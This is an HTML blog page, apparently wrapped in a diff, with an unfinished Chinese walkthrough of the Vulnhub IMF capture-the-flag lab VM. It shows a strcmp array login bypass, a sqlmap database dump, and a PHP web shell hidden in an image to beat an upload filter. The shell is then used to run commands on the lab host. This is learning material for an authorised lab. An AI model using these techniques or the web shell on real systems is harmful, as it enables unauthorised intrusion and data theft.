@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址： https://download.vulnhub.com/imf/IMF.ova IMF是一个初级难度的boot 2 roo">
+<meta name="keywords" content="Vulnhub,IMF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub实战之IMF">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址： https://download.vulnhub.com/imf/IMF.ova IMF是一个初级难度的boot 2 roo">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b6f83bb111.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b702daf200.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b70d5d74b9.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b71e81f588.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b72f07db08.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/03/5c7b8422ef625.png">
+<meta property="og:updated_time" content="2019-12-05T14:08:09.471Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vulnhub实战之IMF">
+<meta name="twitter:description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址： https://download.vulnhub.com/imf/IMF.ova IMF是一个初级难度的boot 2 roo">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/03/5c7b6f83bb111.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Vulnhub实战之IMF</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/20/计网实验之网络包分析工具-Wireshark/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/01/26/计网实验基础之网络命令-ipconfigifconfig和netstat/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&text=Vulnhub实战之IMF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&is_video=false&description=Vulnhub实战之IMF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub实战之IMF&body=Check out this article: https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&name=Vulnhub实战之IMF&description=&lt;h4 id=&#34;简介&#34;&gt;&lt;a href=&#34;#简介&#34; class=&#34;headerlink&#34; title=&#34;简介&#34;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。&lt;/p&gt;
+&lt;p&gt;网址：&lt;a href=&#34;https://www.vulnhub.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.vulnhub.com/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;本文靶机镜像下载地址：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://download.vulnhub.com/imf/IMF.ova&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://download.vulnhub.com/imf/IMF.ova&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IMF是一个初级难度的boot 2 root（查看flag，获得root权限）靶机，每个flag都包含获取下一个flag的提示。&lt;/p&gt;
+&lt;p&gt;作者邮箱：&lt;a href=&#34;mailto:geckom@redteamr.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;geckom@redteamr.com&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&t=Vulnhub实战之IMF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战"><span class="toc-number">2.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#信息收集"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#渗透分析"><span class="toc-number">2.2.</span> <span class="toc-text">渗透分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Vulnhub实战之IMF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Six's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-02T16:00:00.000Z" itemprop="datePublished">2019-03-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全技术/">安全技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/IMF/">IMF</a>, <a class="tag-link" href="/tags/Vulnhub/">Vulnhub</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。</p>
+<p>网址：<a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></p>
+<p>本文靶机镜像下载地址：</p>
+<p><a href="https://download.vulnhub.com/imf/IMF.ova" target="_blank" rel="noopener">https://download.vulnhub.com/imf/IMF.ova</a></p>
+<p>IMF是一个初级难度的boot 2 root（查看flag，获得root权限）靶机，每个flag都包含获取下一个flag的提示。</p>
+<p>作者邮箱：<a href="mailto:geckom@redteamr.com" target="_blank" rel="noopener">geckom@redteamr.com</a></p>
+<a id="more"></a>
+<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>首先使用VMware运行获得的靶机镜像，进入系统发现需要输入密码。</p>
+<p>运行另一台攻击机，我选用的是Kali。使用nmap扫描网段端口，发现主机IP命令。</p>
+<p><img src="https://i.loli.net/2019/03/03/5c7b6f83bb111.png" alt="查找主机IP.png"></p>
+<p>获得目标主机IP地址：192.168.175.135</p>
+<p>对目标IP做进一步的扫描：</p>
+<p><img src="https://i.loli.net/2019/03/03/5c7b702daf200.png" alt="扫描主机.png"></p>
+<p>发现80端口上运行着Apache，利用IP地址直接访问网页。</p>
+<h5 id="渗透分析"><a href="#渗透分析" class="headerlink" title="渗透分析"></a>渗透分析</h5><p><img src="https://i.loli.net/2019/03/03/5c7b70d5d74b9.png" alt="网页.png"></p>
+<p>进入网站，网站有三个选项卡，查看源码，寻找线索。</p>
+<p>在第三个页面的源码处发现第一个flag。</p>
+<p><img src="https://i.loli.net/2019/03/03/5c7b71e81f588.png" alt="flag1.png"></p>
+<p>将第一个flag进行base64解密，得到flag2的提示<code>allthefiles</code>。</p>
+<p>根据提示，在源码中发现引用的JS文件名</p>
+<p><img src="https://i.loli.net/2019/03/03/5c7b72f07db08.png" alt="flag2.png"></p>
+<p>将文件名拼起来，解码，得到flag2：<code>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</code></p>
+<p>再次base64解码后得到提示：<code>imfadministrator</code></p>
+<p>进入<code>192.168.175.135/imfadministrator/</code>，出现一个登录页。任意输入用户名，返回无效的用户名。在之前的网页上查找信息，在contact us页面上有三个人，进行尝试，发现输入第一个人名，返回信息变成了无效密码，说明用户名正确。</p>
+<p>同时阅读源码发现，密码并没有存储在数据库中，而是硬编码在文件中。</p>
+<p>猜测是使用strcmp之类的密码进行判断密码。<code>当strcmp的两个字符串参数相等时会返回0，但如果把string和array进行比较，同样也会返回0</code>.</p>
+<p>所以，这里将源码中的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"pass"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">改为</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"pass[]"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样就可以使得pass参数变成了一个array。</p>
+<p>获得flag3：<code>flag{Y29udGludWVUT2Ntcw==}</code></p>
+<p>base64解码后，获得：<code>continueTOcms</code>。</p>
+<p>进入CMS浏览网页，发现url中存在参数pagename，可能存在注入点，复制cookie信息，使用sqlmap进行注入测试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.190.128/imfadministrator/cms.php?pagename=upload --cookie "PHPSESSID=9q75n4adk0os5lultm4a5934t2" --dump</span><br></pre></td></tr></table></figure>
+<p>dump在数据库中发现共有四项，后两项包含两张图片，访问后，发现第三项中的图片含有一个二维码，扫描后获得flag4：<code>flag4{dXBsb2Fkcjk0Mi5waHA=}</code>。解码后获得：<code>uploadr942.php</code></p>
+<p>根据提示，进入一个文件上传页面，应该存在文件上传漏洞。</p>
+<p>经过测试，只能上传图片（jpg,png,gif）,存在WAF和文件头过滤。上传成功后在注释中会出现上传后的文件名。</p>
+<p>尝试将PHP代码加入图片中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $s=$_GET[<span class="string">'s'</span>]; <span class="keyword">echo</span> `$s`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在win 上，使用命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/b+2.php 3.png</span><br></pre></td></tr></table></figure>
+<p>图片上传成功，需要寻找存储的路径，利用工具dirb：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.175.135/imfadministrator</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/03/03/5c7b8422ef625.png" alt="dirb.png"></p>
+<p>发现存在uploads文件夹。</p>
+<p>访问：<code>http://192.168.175.135/imfadministrator/uploads/ebfcb10328e2.gif？s = ls</code></p>
+<p>返回结果中，发现文件<code>flag5_abc123def.txt</code>，使用<code>s = cat flag5_abc123def.txt</code>,获得<code>flag5{YWdlbnRzZXJ2aWNlcw==}</code>，解码后得到<code>agentservices</code>。</p>
+<p>根据提示，入口点应该在一个名叫<code>agent</code>的服务上。</p>
+<blockquote>
+<p>未完待续</p>
+</blockquote>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>源文件包含flag</li>
+<li>分析源码，如本文中的flag3</li>
+<li>WAF绕过</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战"><span class="toc-number">2.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#信息收集"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#渗透分析"><span class="toc-number">2.2.</span> <span class="toc-text">渗透分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&text=Vulnhub实战之IMF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&is_video=false&description=Vulnhub实战之IMF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub实战之IMF&body=Check out this article: https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&title=Vulnhub实战之IMF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&name=Vulnhub实战之IMF&description=&lt;h4 id=&#34;简介&#34;&gt;&lt;a href=&#34;#简介&#34; class=&#34;headerlink&#34; title=&#34;简介&#34;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。&lt;/p&gt;
+&lt;p&gt;网址：&lt;a href=&#34;https://www.vulnhub.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.vulnhub.com/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;本文靶机镜像下载地址：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://download.vulnhub.com/imf/IMF.ova&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://download.vulnhub.com/imf/IMF.ova&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IMF是一个初级难度的boot 2 root（查看flag，获得root权限）靶机，每个flag都包含获取下一个flag的提示。&lt;/p&gt;
+&lt;p&gt;作者邮箱：&lt;a href=&#34;mailto:geckom@redteamr.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;geckom@redteamr.com&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/03/03/Vulnhub实战之IMF/&t=Vulnhub实战之IMF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Six
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
